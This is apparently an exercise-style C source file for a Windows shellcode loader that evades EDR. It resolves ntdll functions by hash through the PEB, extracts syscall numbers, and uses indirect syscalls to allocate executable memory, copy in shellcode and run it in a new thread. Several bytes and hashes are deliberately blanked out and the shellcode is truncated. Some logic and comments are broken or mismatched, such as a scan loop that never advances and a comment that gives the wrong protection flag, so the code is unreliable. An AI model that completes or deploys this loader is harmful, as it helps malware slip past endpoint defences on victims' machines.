// Creds to the creators from Hell's Gate, Hell's Hall, Halos Gate and D1rkLdr
// https://github.com/TheD1rkMtr/D1rkLdr/tree/main/D1rkLdr
// https://github.com/am0nsec/HellsGate/tree/master
// https://github.com/Maldev-Academy/HellHall

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
// something is missing here ;-)


// statically linking the ntdll library
#pragma comment(lib, "ntdll.lib")

// this macro returns a pseudo-handle for the current process
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

// Function to calculate a simple hash for a given string
DWORD calcHash(char* data) {
    DWORD hash = 0x99; // initial hash value
    for (int i = 0; i < strlen(data); i++) { // for each character in the string
        hash += data[i] + (hash << 1); // calculate hash
    }
    return hash;
}

// Function to calculate the hash of a module
static DWORD calcHashModule(LDR_MODULE* mdll) {
    char name[64]; // buffer to store the module name
    size_t i = 0;

    // copying the module name into the local buffer
    while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
        name[i] = (char)mdll->dllname.Buffer[i];
        i++;
    }
    name[i] = 0; // null-terminating the string
    return calcHash((char*)CharLowerA(name)); // converting the name to lower case and calculating hash
}


//--------------------------------------------------------------------------------------------------------------------------------


// Function to get the base address of a module (dll) by hash
static HMODULE GetModule(DWORD myHash) {
    HMODULE module;
    INT_PTR peb = __readgsqword(0x60); // getting a pointer to the PEB (Process Environment Block)
    auto ldr = 0x18; // offset to the PEB_LDR_DATA structure from the PEB
    auto flink = 0x10; // offset to the first entry in the InMemoryOrderModuleList linked list

    auto Mldr = *(INT_PTR*)(peb + ldr); // pointer to the PEB_LDR_DATA structure
    auto M1flink = *(INT_PTR*)(Mldr + flink); // pointer to the first LDR_MODULE structure in the list
    auto Mdl = (LDR_MODULE*)M1flink; // type casting the pointer to LDR_MODULE structure
    do {
        Mdl = (LDR_MODULE*)Mdl->e[0].Flink; // moving to the next module in the list
        if (Mdl->base != NULL) { // if the module is loaded
            if (calcHashModule(Mdl) == myHash) { // if the module's hash matches our target hash
                break;
            }
        }
    } while (M1flink != (INT_PTR)Mdl); // loop until we looped through the whole list

    module = (HMODULE)Mdl->base; // type casting the base address of the module to HMODULE
    return module;
}


//--------------------------------------------------------------------------------------------------------------------------------

// Function to get the address of a function by hash
static LPVOID GetFunctionAddr(HMODULE module, DWORD myHash) {

    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((LPBYTE)module + DOSheader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)(
        (LPBYTE)module + NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)module + EXdir->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)module + EXdir->AddressOfNames);
    PWORD  fOrdinals = (PWORD)((LPBYTE)module + EXdir->AddressOfNameOrdinals);

    // loop through all exported functions
    for (DWORD i = 0; i < EXdir->AddressOfFunctions; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)module + fNames[i]);
        if (calcHash(pFuncName) == myHash) {
            return (LPVOID)((LPBYTE)module + fAddr[fOrdinals[i]]);
        }
    }
    return NULL;
}


//--------------------------------------------------------------------------------------------------------------------------------


// Function to retrieve syscall number given an address.
WORD GetsyscallNum(LPVOID addr) {

    WORD SSN = NULL;

    while (TRUE) {
        // Check if the current bytes represent a syscall; if so, we've gone too far.
        if (*((PBYTE)addr) == 0x0f && *((PBYTE)addr + 1) == 0x05)
            return FALSE;
        // Check if the current byte is a return opcode; if so, we've gone too far.
        if (*((PBYTE)addr) == 0xc3)
            return FALSE;
        // Check if the current bytes match the pattern from an unhooked clean syscall stub from a native function e.g. NtAllocateVirtualMemory; if so, return the syscall number.
        if (*((PBYTE)addr) == 0x4c
            && *((PBYTE)addr + 1) == 0x8b
            && *((PBYTE)addr + 2) == // something is missing here
            && *((PBYTE)addr + 3) == // something is missing here
            && *((PBYTE)addr + 6) == // something is missing here
            && *((PBYTE)addr + 7) == 0x00) {

            BYTE high = *((PBYTE)addr + 5);
            BYTE low = *((PBYTE)addr + 4);
            SSN = (high << 8) | low;

            return SSN;
        }
    }
}

// Function to retrieve address of syscall instruction given an address.
INT_PTR GetsyscallInstr(LPVOID addr) {
    
    WORD SSN = NULL;
    
    // Check if the current bytes match the pattern from an unhooked clean syscall stub from a native function e.g. NtAllocateVirtualMemory; if so, return the syscall number.
    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == // something is missing here
        && *((PBYTE)addr + 3) == // something is missing here
        && *((PBYTE)addr + 6) == // something is missing here
        && *((PBYTE)addr + 7) == 0x00) {

        return (INT_PTR)addr + 0x12;    // Address of syscall instruction
    }
}

//--------------------------------------------------------------------------------------------------------------------------------


int main() {
    // Define shellcode to be injected.
    const char shellcode[] = "\xfc\x48\x83...";

    
    LPVOID addr = NULL; // Address of the function in ntdll.dll
    DWORD syscallNum = NULL; // Syscall number
    INT_PTR syscallAddr = NULL; // Address of the syscall instruction

    // Retrieve handle to ntdll.dll
    HMODULE ntdll = GetModule(4097367);

    //--------------------------------------------------------------------------------------------------------------------------------

    PVOID BaseAddress = NULL; // Base address for the shellcode
    SIZE_T RegionSize = sizeof(shellcode); // Size of the shellcode region

    addr = GetFunctionAddr(ntdll, 18887768681269);     // Retrieve the address of the function within ntdll.dll that corresponds to the hash 8454456120 (NtAllocateVirtualMemory)
    syscallNum = GetsyscallNum(addr);				  // Based on the address of the function, use the GetSyscallNum function to get the S  
    syscallAddr = GetsyscallInstr(addr);		     // Now that we have the address of the function, we can find out what the address of the syscall instruction is.

    PrepareSSN(syscallNum);							// Call the external defined function PrepareSSN defined in syscalls.h to store the SSN and then pass it to the MASM code. 
    PrepareSyscallInst(syscallAddr);               // Call the external defined function PrepareSyscallInst defined in syscalls.h to store the address of the syscall instruction and then pass it to the MASM code.

    // Allocate memory for the shellcode
    NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    //--------------------------------------------------------------------------------------------------------------------------------


    // Copy the shellcode into the allocated memory region
    memcpy(BaseAddress, shellcode, sizeof(shellcode));

    //--------------------------------------------------------------------------------------------------------------------------------


    HANDLE hThread; // Handle to the newly created thread
    DWORD OldProtect = NULL; // Previous protection level of the memory region

    // Retrieve the address of NtProtectVirtualMemory in ntdll.dll
    addr = GetFunctionAddr(ntdll, /*something is missing here*/ );
    syscallNum = GetsyscallNum(addr);
    syscallAddr = GetsyscallInstr(addr);
    PrepareSSN(syscallNum);
    PrepareSyscallInst(syscallAddr);

    // Change the protection level of the memory region to PAGE_EXECUTE_READWRITE
    NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_EXECUTE_READ, &OldProtect);


    //--------------------------------------------------------------------------------------------------------------------------------

    HANDLE hHostThread = INVALID_HANDLE_VALUE; // Handle to the host thread

    // Retrieve the address of NtCreateThreadEx in ntdll.dll
    addr = GetFunctionAddr(ntdll, /*something is missing here*/ );
    syscallNum = GetsyscallNum(addr);
    syscallAddr = GetsyscallInstr(addr);
    PrepareSSN(syscallNum);
    PrepareSyscallInst(syscallAddr);
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);


    //--------------------------------------------------------------------------------------------------------------------------------

    // Retrieve the address of NtWaitForSingleObject in ntdll.dll
    addr = GetFunctionAddr(ntdll, /*something is missing here*/);
    syscallNum = GetsyscallNum(addr);
    syscallAddr = GetsyscallInstr(addr);
    PrepareSSN(syscallNum);
    PrepareSyscallInst(syscallAddr);
    NtWaitForSingleObject(hThread, FALSE, NULL);

    return 0;
}
